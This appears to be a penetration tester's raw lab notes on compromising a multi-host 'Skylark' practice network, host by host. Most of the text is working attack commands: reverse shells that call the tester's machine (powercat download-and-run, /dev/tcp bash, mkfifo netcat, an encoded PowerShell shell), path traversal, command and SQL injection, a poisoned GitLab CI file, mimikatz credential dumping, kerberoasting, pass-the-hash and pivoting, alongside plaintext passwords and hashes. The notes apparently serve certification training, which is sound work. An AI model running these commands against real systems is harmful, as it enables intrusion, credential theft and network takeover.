```bash
nmap 192.168.240.220-227 192.168.240.250
```

.250
```bash
nmap 192.168.240.250
nmap -sT -A -p 5040,49664 192.168.240.250
sudo nmap -O 192.168.240.250 --osscan-guess
sudo nmap -sU --open -p 161 192.168.240.250

# only ports open (no snmp): 135,139,445,3389,5040,49664-49670
```

.220 - (Skylark Partner Portal)
```bash
nmap 192.168.240.220

# ports open: 80,135,139,445,5900(vnc),5985,47001(winrm),49664-49670
nmap -sT -A -p 80 192.168.186.220

# enumerate vnc, cannot connect
nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -p 5900 192.168.240.220
hydra -s 5900 -P /usr/share/seclists/Passwords/Default-Credentials/vnc-betterdefaultpasslist.txt -t 16 192.168.240.220 vnc
vncviewer 192.168.229.220::5901

# enumerate smb - we need a password to do anything
enum4linux 192.168.240.220
nmap -v -p 139,445 --script smb-os-discovery 192.168.240.220
smbclient -L 192.168.186.220 -U skylark
smbmap -H 192.168.240.220

# enumerate webserver
# cracking using the 10million will take way too long, smaller lists have no effect
hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/seclists/Passwords/probable-v2-top1575.txt -s 80 -f 192.168.240.220 http-get /
feroxbuster --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt --url http://skylark:User+dcGvfwTbjV[]@192.168.186.220
feroxbuster --wordlist /usr/share/wordlists/dirb/big.txt --url http://skylark:User+dcGvfwTbjV[]@192.168.186.220

# we got creds from .11 for the partner portal
skylark:User+dcGvfwTbjV[]

# test for path traversal
http://192.168.229.220/download?filename=../../../../../../../../../../../inetpub/wwwroot/web.config

http://192.168.229.220/download?filename=../../../../../../../../../../../inetpub/wwwroot/appsettings.json

http://192.168.229.220/download?filename=../../../../../../../../../../../C:/Uploads/f63a20c6test2.ps1
http://192.168.229.220/download?filename=../../../../../../../../../../../Uploads/f63a20c6test2.ps1

# obtain admin creds
skylark_admin
Admin!_xDHj88vAnS!__

# with admin creds look  for directories again
feroxbuster --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt --url http://skylark_admin:Admin!_xDHj88vAnS!__@192.168.229.220

# find /configuration
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.45.229 lport=443 -f psh-reflection -o shell.ps1

# partner creds
partner:Skylark__ChangingTheWorld!

http://192.168.229.220/upload
http://192.168.229.220/configuration

C:\Uploads\ddda527bshell3.ps1

http://192.168.229.220/download?filename=f63a20c6test2.ps1

echo "Hello" | pandoc -o out2.docx

# used this one for the ps1 shell
IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.229/powercat.ps1');powercat -c 192.168.45.229 -p 443 -e cmd

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.229 LPORT=443 -f exe > rev443.exe

Get-ChildItem -Path C:\ -Include *.ini -File -Recurse -ErrorAction SilentlyContinue

# find vnc file
cat C:\"Program Files"\"uvnc bvba"\UltraVNC\ultravnc.ini

# obtain vnc password hashes
passwd=BFE825DE515A335BE3
passwd2=59A04800B111ADB060

# decrypt using vncpasswd python script - https://github.com/trinitronx/vncpasswd.py
git clone https://github.com/trinitronx/vncpasswd.py.git vncpasswd.py
cd vncpasswd.py
python2 ./vncpasswd.py --help
python2 ./vncpasswd.py --decrypt 59A04800B111ADB060 --hex
# use the bin result - ABCDEFGH
python2 ./vncpasswd.py --decrypt BFE825DE515A335BE3 --hex
# R3S3+rcH
```
.220 privesc
```bash
# we have SeImpersonate
# using EFS potato we can get a root shell on 9999
iwr -uri http://192.168.45.229/efspotato.cs -Outfile efspotato.cs
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe efspotato.cs
iwr -uri http://192.168.45.229/nc.exe -Outfile nc.exe

.\efspotato.exe "nc.exe 192.168.45.229 9999 -e cmd"
```

.221 (austin02.SKYLARK.com)
```bash
nmap 192.168.240.221
nmap -sT -A -p 80,443 192.168.248.221
sudo nmap -sU --open -p 161 192.168.248.221
sudo nmap -p- -Pn 192.168.248.221 -sS -T 5 --verbose
# port 80,443,135,139,445,3387,5504,5985(wsman) open
# also port 47001,49664,49665,49666,49667,49668,49670-75,49680

# enumerate port 10000 (i don't think it's actually ndmp, but another rdp port)
nmap -n -sV --script "ndmp-fs-info or ndmp-version" -p 10000 192.168.240.221

# enumerate smb - we need a password to do anything
enum4linux 192.168.240.221
nmap -v -p 139,445 --script smb-os-discovery 192.168.240.221
smbclient -L 192.168.240.221
smbmap -H 192.168.240.221

# enumerate webserver
nikto -host 192.168.248.221 -port 80
whatweb http://192.168.248.221:80
gobuster dir -u http://192.168.240.221:80 -w /usr/share/wordlists/dirb/common.txt
feroxbuster --wordlist /usr/share/seclists/Discovery/Web-Content/Common-PHP-Filenames.txt --url http://192.168.248.221 --dont-scan /aspnet_client,/Aspnet_client,/Aspnet_Client,/aspnet_Client,/ASPNET_CLIENT
feroxbuster --wordlist /usr/share/seclists/Discovery/Web-Content/Common-PHP-Filenames.txt --url http://192.168.248.225:8090/backend/default

# login to webserver on https://192.168.248.221/RDWeb with creds from the pdf on 225
SKYLARK\kiosk - XEwUS^9R2Gwt8O914

# use this command for initial access. Click on 'austin02' link, then open cmd.exe from the filesystem
xfreerdp cpub-SkylarkStatus-QuickSessionCollection-CmsRdsh.rdp /u:kiosk /p:XEwUS^9R2Gwt8O914 /d:SKYLARK /v:192.168.229.221

xfreerdp /u:kiosk /p:XEwUS^9R2Gwt8O914 /d:SKYLARK /v:192.168.186.221

# get a better shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.217 LPORT=9999 -f exe -o shell.exe
nc -nvlp 8888
iwr -uri http://192.168.45.217:8000/shell8888.exe -Outfile shell.exe
.\shell.exe
```

.221 privesc
```bash
iwr -uri http://192.168.45.217/winPEASx64.exe -Outfile winPEAS.exe
.\winPEAS.exe

# findings
type C:\Users\kiosk\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
kiosk has a .ssh directory

# find that we have an internal interface with some ports running on it
ipconfig /all
netstat -ano
10.10.76.254:139
10.10.76.254:40000
10.10.76.254:57215 

chisel server --port 80 --reverse
sudo tcpdump -nvvvXi tun0 tcp port 8081
iwr -uri http://192.168.45.217/chisel.exe -Outfile chisel.exe

.\chisel.exe client 192.168.45.217:80 R:40000:10.10.76.254:40000
# connect to this port locally, can't access from browser
nc 127.0.0.1 40000

# create another shell on the target to exploit command injection
cd C:\temp
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.217 LPORT=8888 -f exe -o shell8888.exe
nc -nvlp 9999
iwr -uri http://192.168.45.217:8000/shell8888.exe -Outfile shell.exe

# from the prompt on 40000 write config to inject the shell to get admin
write_config 123';c:\temp\shell.exe '123

# doesn't work, apparently not a domain user
iwr -uri http://192.168.45.217:8000/SharpHound.ps1 -Outfile SharpHound.ps1
powershell -ep bypass
Import-Module .\Sharphound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:/Users/michelle

# mimikatz
iwr -uri http://192.168.45.217:8000/mimikatz.exe -Outfile mimikatz.exe
. .\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
lsadump::cache 
token::elevate
lsadump::sam

MSSQL$MICROSOFT##WID
fdb2ea0d22188397bdc0f08ba4081549

Administrator
17add237f30abaecc9d884f72958b928

# kerberoast
# NOTE: need to be NT/authority system
iwr -uri http://192.168.45.217:8000/Invoke-Kerberoast.ps1 -Outfile Invoke-Kerberoast.ps1
powershell -ep bypass
Import-Module .\Invoke-Kerberoast.ps1
Invoke-Kerberoast -Domain skylark.com

# using EFS potato we can get a root shell on 9999
iwr -uri http://192.168.45.217:8000/efspotato.cs -Outfile efspotato.cs
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe efspotato.cs
iwr -uri http://192.168.45.217:8000/nc.exe -Outfile nc.exe
.\efspotato.exe "whoami"
.\efspotato.exe "nc.exe 192.168.45.217 7777 -e cmd"

# backup_service: It4Server
sudo hashcat -m 13100 backup.kerberoast /usr/share/wordlists/rockyou.txt --force
```

.221 pivot -> .10 -> pivot to .111, .110
```bash
# from kali
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert
# from proxy on kali
>> session
>> start

# add route to internal network
sudo ip route add 10.10.84.0/24 dev ligolo

# from windows target C:/Users/kiosk
iwr -uri http://192.168.45.229/agent.exe -Outfile agent.exe
./agent.exe -ignore-cert -connect 192.168.45.229:11601

# 22,5901
sudo nmap -p- -Pn 10.10.119.10 -sS -T 5 --verbose

# 445, 5985
sudo nmap -p- -Pn 10.10.76.11 -sS -T 5 --verbose

impacket-smbclient backup_service@10.10.76.11
crackmapexec smb 10.10.76.11 -u backup_service -p It4Server --continue-on-success
crackmapexec smb -u backup_service -p 'It4Server' -X "whoami" 10.10.76.11
crackmapexec winrm 10.10.76.11 -u backup_service -p It4Server --continue-on-success --local-auth

#22,139,445,8080
sudo nmap -p- -Pn 10.10.76.12 -sS -T 5 --verbose

sudo nmap -p- -Pn 10.10.76.13 -sS -T 5 --verbose
crackmapexec smb 10.10.76.13 -u backup_service -p It4Server --continue-on-success
crackmapexec winrm 10.10.76.13 -u backup_service -p It4Server --continue-on-success
impacket-psexec -hashes :17add237f30abaecc9d884f72958b928 Administrator@10.10.76.13 

```

.10
```bash
# 22,5901
sudo nmap -p- -Pn 10.10.119.10 -sS -T 5 --verbose
vncviewer 10.10.84.10::5901
# need password from 220 - the first password works
passwd=R3S3+rcH
passwd2=ABCDEFGH
```

.10 privesc
```bash
sudo -l
# have sudo on ss and ip
https://gtfobins.github.io/gtfobins/ip/#sudo
sudo ip netns add foo
sudo ip netns exec foo /bin/bash
```

.10 -> .14 (another level of internal network) (CICD)
```bash
# in research dir add shell command
vi scratchpad/.gitlab-ci.yml

# setup pivot to 14 - use this guide to double pivot https://4pfsec.com/ligolo
# add listener on existing session
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp

# download agent on the second machine
wget http://192.168.45.229/agent -O agent
chmod +x agent
# connect to the first machine we proxied to from kali
./agent -connect 192.168.194.221:11601 -ignore-cert

# try this ifcant connect to 11601
listener_add --addr 0.0.0.0:8000 --to 127.0.0.1:11601 --tcp
./agent -connect 192.168.229.221:8000 -ignore-cert
# from kali
session
# switch to newly added session

# add route to access
sudo ip route add 10.20.119.0/24 dev ligolo

# verify connectivity
nmap 10.20.84.14 -p 80  

# get shell on 14
cd scratchpad
nano .gitlab-ci.yml
# add to one of the steps - will be executed on git push
/bin/bash -l > /dev/tcp/192.168.45.229/7777 0<&1 2>&1
git add .
git commit -m 'update ci'
git push origin main

# creds for pushing to git
root
glpat-PzrxBe-5Js7c3t7hoq4X
```

.14 privesc (CICD)
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'

# get better shell
msfvenom -p cmd/unix/reverse_bash LHOST=192.168.45.229 LPORT=4444 -f raw -o shell.sh
wget http://192.168.45.229/shell.sh -O shell.sh

wget http://192.168.45.229/linpeas.sh -O linpeas.sh

# don't seem to do anything
research@skylark.com
gitlab-ci-token
WA82ZcgSY4_Gft7c8bzF

# running as root
/usr/bin/gitlab-runner run --working-directory /home/gitlab-runner --config /etc/gitlab-runner/config.toml --service gitlab-runner --user gitlab-runner
runsvdir -P /opt/gitlab/service log
/home/gitlab-runner/.local/share/gvfs-metadata/root-8a0803bc.log

wget http://192.168.45.229/pspy64 -O pspy

/opt/gitlab/embedded/bin/postgres -D /var/opt/gitlab/postgresql/data 
/opt/gitlab/embedded/bin/postgres_exporter --web.listen-address=localhost:9187 --extend.query-path=/var/opt/gitlab/postgres-exporter/queries.yaml 

find . -name local.txt 2>/dev/null
/bin/bash /opt/fs_checks/fs.sh

# modify the helper for this script
cat /opt/fs_checks/fs.sh
cat /opt/u/__fs.sh

# get a root shell - workaround for not being able to do interactive terminal
cd  /home/gitlab-runner
cp /opt/u/__fs.sh /home/gitlab-runner
sed -i '/EXPECTED_USERS="54"/a \/bin\/bash -l > \/dev\/tcp\/192.168.45.229\/5555 0<&1 2>&1' __fs.sh
cat __fs.sh > /opt/u/__fs.sh

# findings from root linpeas
 "email"=>"development@skylark.com",
 "encrypted_password"=>
  "$2a$10$.B9bs.xb808RvTrgouKgAeMA9HQtNEU8/M6ajyWFJeAYdwEnmpADK",

```

with double-pivot to x.20 scan other machines
```bash
nmap 10.20.84.15 10.20.84.110 10.20.84.111

```

.15
```bash
# ports open: 80,445,1433(mssql)
# we can login with domain admin creds
crackmapexec smb 10.20.84.15 -u backup_service -p It4Server --continue-on-success
crackmapexec smb 10.20.84.15 -u backup_service -p 'It4Server' -X "whoami"

```

.110
```bash
# ports open: 445,3389
# since backup_service is domain admin, check to see if creds work. they do and we can login using psexec
crackmapexec smb 10.20.84.110 -u backup_service -p It4Server --continue-on-success
impacket-psexec backup_service:It4Server@10.20.84.110

# find proof.txt, can't pass directory so need to be in C:\Users
Get-Childitem -recurse -filter "proof.txt" -ErrorAction SilentlyContinue

iwr -uri http://192.168.45.229/mimikatz.exe -Outfile mimikatz.exe
. .\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
lsadump::cache 
token::elevate
lsadump::sam

# NTLM hashes found
k.smith
d2a87ca4d6735870dc2357a83960c379

offsec
7f87fb27f65463aca8630598c49c6de3
```

.111
```bash
nmap 10.20.84.111
crackmapexec smb 10.20.84.15 -u backup_service -p It4Server --continue-on-success
```

.11
```bash
crackmapexec smb 10.10.76.11 -u backup_service -p 'It4Server' -X "powershell.exe -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMQA3ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="

# from backup share obtained
ftp_jp:~be<3@6fe1Z:2e8
# creds for partner portal (220)

powershell.exe -c 'Get-ChildItem -Path C:\ -Filter local.txt -Recurse -ErrorAction SilentlyContinue -Force'
```

.13 - mail server use for phishing
```bash
sudo nmap -p- -Pn 10.10.76.13 -sS -T 5 --verbose
crackmapexec smb 10.10.76.13 -u backup_service -p It4Server --continue-on-success
crackmapexec winrm 10.10.76.13 -u backup_service -p It4Server --continue-on-success
impacket-psexec -hashes :17add237f30abaecc9d884f72958b928 Administrator@10.10.76.13 


crackmapexec smb 10.10.76.13 -u backup_service -p 'It4Server' -X "powershell.exe -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMQA3ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
```

.222
```bash
nmap 192.168.213.222
sudo nmap -sU --open -p 161 192.168.213.222

# ports 135,139,445,2994(veritas-vis2),5985(wsman),47001(winrm),49664-49670

# enumerate smb - we need a password to do anything
enum4linux 192.168.213.222
nmap -v -p 139,445 --script smb-os-discovery 192.168.213.222
smbclient -L 192.168.213.222
smbmap -H 192.168.213.222

crackmapexec winrm 192.168.186.222 -u backup_service -p pIt4Server --continue-on-success --local-auth
impacket-psexec -hashes :17add237f30abaecc9d884f72958b928 Administrator@192.168.186.222
```

.223 (milan) (standalone)
```bash
nmap 192.168.213.223
sudo nmap -sU --open -p 161 192.168.213.223

# 80,443 show up, but are closed, 161 open
# fastest nmap scan (-pN, -sT make it slower)
sudo nmap -p- -Pn 192.168.213.223 -sS -T 5 --verbose
nmap -sT -A -p 60001 192.168.213.223

# enumerate webserver at 60001
gobuster dir -u http://192.168.213.223:60001 -w /usr/share/wordlists/dirb/common.txt
feroxbuster --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt --url http://192.168.213.223:60001

# find http://192.168.213.223:60001/docs/release_notes.pdf - # osCommerce 2.3.4.1
# find https://www.exploit-db.com/exploits/44374

# run to get shell on 443
python3 44374.py

# source for shells: https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
# Does not work
my_shell_file = open("/home/kali/relia/shell.php")
shell_data = my_shell_file.read()

# bash -e does not work
payload += 'system("nc -e /bin/bash 192.168.45.160 443");'

# doesn't work, probably not using file descriptor 3
payload += '$sock=fsockopen("192.168.45.160",443);exec("/bin/sh -i <&3 >&3 2>&3");'

# This one works. (alternative if nc -e does not work)
payload += 'system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.160 443 >/tmp/f");'

nc -nvlp 443
```

.223 privesc
```bash
wget http://192.168.45.160/linpeas.sh -O linpeas.sh

# findings
# root is running an apache2 process
# writable /var/www/html/froxlor, also a github repo
# so there's an apache server running on 60002 (and 80?) that's running this froxlor thing, owned by root - we know what is running where because linpeas outputs apache configs
# users milan and sarah, milan is in the adm and sudo groups
# port 60002, 631, 3306, 22 are active on the box (see active ports section from linpeas)
# this command would show you what is on 60002 but we aren't root
netstat -ltnp | grep -w ':60002'
netstat -ltnp | grep -w ':80'
# find db creds
db=oscdb, user=oscuser, password=7NVLVTDGJ38HM2TQ
# local.txt is in /root

searchsploit -m 51263

chisel server --port 80 --reverse
sudo tcpdump -nvvvXi tun0 tcp port 8081
wget http://192.168.45.160/chisel -O chisel

# need to use port 80 because other ports seem to be blocked. we need to use a port that's open on the target machine
./chisel client 192.168.45.160:80 R:60002:0.0.0.0:60002

# try froxlor RCE exploit - https://github.com/mhaskar/CVE-2023-0315
wget https://raw.githubusercontent.com/mhaskar/CVE-2023-0315/main/froxlor-rce.py
python3 froxlor-rce.py http://127.0.0.1:60002 admin password 182.168.45.160 9999

# can't login. let's see if we can access the internal mysql server using previously found creds
# from target
./chisel client 192.168.45.160:80 R:3306:0.0.0.0:3306
# from kali - pw: 7NVLVTDGJ38HM2TQ
mysql -u oscuser -D oscdb -h 127.0.0.1 -p
select * from administrators;
# find a user (admin) and password hash
$P$DVNsEBdq7PQdr7GR65xbL0pas6caWx0 
hashid admin.md5.hash # phpass
hashcat --help | grep 'phpass' # mode 400
hashcat -m 400 admin.md5.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

# we need to get into the froxlor DB instead of sscdb to get password hashes
/etc/mysql/my.cnf
/etc/mysql/mariadb.cnf 
/var/www/html/froxlor/.github
/var/www/html/froxlor/logs
/var/www/html/froxlor/admin_configfiles.php - says it has mysql password FROXLOR_MYSQL_PASSWORD

# turns out we can just use the same password of the oscdb user as root 
use froxlor;
select loginname, password from panel_admins;
select * from panel_customers;
$5$b50069d236c187f2$PIeKl3JO.NJ5X0hhtHjmJx9nDtImDP61/x4D8Rv/Gu/ 
hashid panel.hash # [+] SHA-256 Crypt 
hashcat --help | grep 'crypt' # 7400 | sha256crypt $5$, SHA256 (Unix)  
# not able to crack admin password
hashcat -m 7400 panel.hash /usr/share/wordlists/rockyou.txt
# able to crack - Christopher
hashcat -m 7400 flybike.hash /usr/share/wordlists/rockyou.txt

# need to use a different exploit, as the first one requires that you already have the admin creds
# use #4 from here: https://www.exploit-db.com/exploits/50502
# add the following to the db name in 'create database'
`;insert into panel_admins (loginname,password,customers_see_all,domains_see_all,caneditphpsettings,change_serversettings) values ('x','$5$ccd0bcdd9ab970b1$Hx/a0W8QHwTisNoa1lYCY4s3goJeh.YCQ3hWqH1ZUr8',1,1,1,1);--

# settings -> webserver -> webserver reload command as administrator, then reload configuration files
# the shell back doesn't work probably because i'm already using the ports 80,, 443
# changing bash to suid binary then executing bash -p is another great way to get root shell  
nc -e bash 192.168.45.160 443
chmod u+s /usr/bin/bash
bash -p

# where I installed linpeas
/var/www/html/oscommerce/catalog/install/includes
```

.224
```
nmap 192.168.248.224
sudo nmap -sU --open -p 161 192.168.248.224
sudo nmap -p- -Pn 192.168.248.224 -sS -T 5 --verbose
nmap -sT -A -p 8000,3128 192.168.248.224

# ports open: 22, 3128 (squid), 8000

# enumerate squid - Squid http proxy 4.10
# https://book.hacktricks.xyz/network-services-pentesting/3128-pentesting-squid
# Squid is a caching and forwarding HTTP web proxy.

# enumerate webserver
whatweb 192.168.248.224:8000

feroxbuster --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt --url http://192.168.248.224:8000
# find http://192.168.248.224:8000/debug.txt, is just output of ifconfig, showing connection to interntal 172.x network
```

.225 (singapore) (standalone)
```
nmap 192.168.248.225
sudo nmap -sU --open -p 161 192.168.248.225
sudo nmap -p- -Pn 192.168.248.225 -sS -T 5 --verbose
nmap -sT -A -p 80,8090 192.168.248.225

# open ports: 21, 80, 8090

# enumerate ftp
nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 192.168.248.225

# enumerate webserver port 80
whatweb 192.168.248.225
nikto -host 192.168.248.225 -port 80
sudo nmap -sV -p 80 --script "vuln" 192.168.248.225
feroxbuster --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt --url http://192.168.248.225

# enumerate webserver port 8090
whatweb 192.168.248.225:8090
nikto -host 192.168.248.225 -port 8090
sudo nmap -sV -p 8090 --script "vuln" 192.168.248.225
gobuster dir -u http://192.168.248.225:8090 -w /usr/share/wordlists/dirb/big.txt
feroxbuster --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt --url http://192.168.248.225:8090
# find http://192.168.248.225:8090/backend/default/uploads/ but 403
gobuster dir -u http://192.168.248.225:8090 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x jpg,jpeg,pdf,lnk,conf

# try php files always if we can't find anything. in this case we found some directories but no files inside the directories
feroxbuster --wordlist /usr/share/seclists/Discovery/Web-Content/Common-PHP-Filenames.txt --url http://192.168.248.225:8090/backend/default

# on index.php, log in with admin:admin
# we need to test a bunch of default creds such as admin:password, or admin:admin

# can only upload a file that looks like a pdf so we need to add this to the top of our php shell file, but use the .php extension
%PDF-1.5
# go here to catch shell
http://192.168.248.225:8090/backend/default/uploads/shell.php
```

.224 privesc
```
wget http://192.168.45.160/linpeas.sh -O linpeas.sh

# this produces a bash one-liner
msfvenom -p cmd/unix/reverse_bash LHOST=192.168.45.160 LPORT=4444 -f raw -o shell.sh
wget http://192.168.45.160/shell.sh -O shell.sh

/var/log/nginx/access.log
/var/www/backend/default/config.php
/var/lib/php/sessions
/var/metrics
/var/tmp

/root/local.txt

pg_connect("host=localhost port=5432 dbname=webapp user=postgres password=EAZT5EMULA75F8MC");

wget http://192.168.45.160/chisel -O chisel
./chisel client 192.168.45.160:8090 R:5433:0.0.0.0:5432

# run this from the target
python3 -c 'import pty; pty.spawn("/bin/sh")'
sudo psql -h 127.0.0.1 -p 5432 -U postgres

# try this exploit
https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/multi/postgres/postgres_copy_from_program_cmd_exec.md

# the above exploit gives you a shell as the postgres user, sudo -l tells you that we can run the psql command using sudo
# https://gtfobins.github.io/gtfobins/psql/ - exploit using this

/usr/share/doc/vsftpd/examples/INTERNET_SITE/vsftpd.conf
/usr/lib/tmpfiles.d/vsftpd.conf
/usr/share/nginx
etc/nginx/nginx.conf
/etc/php/7.4/cli/php.ini
/etc/nginx/

# try to find passwords
https://juggernaut-sec.com/password-hunting-lpe/

/d:skylark /u:kiosk /p:XEwUS^9R2Gwt8O914 
# as it turns out the password we need is right in front of us
http://192.168.248.225:8090/backend/default/uploads/user-guide-rdweb.pdf

grep --color=auto -rnw -iIe "PASSW\|PASSWD\|PASSWORD\|PWD" --color=always 2>/dev/null
grep --color=auto -rnw '/' -iIe "kiosk" --color=always 2>/dev/null

find . -type f -iname '*.pdf'
```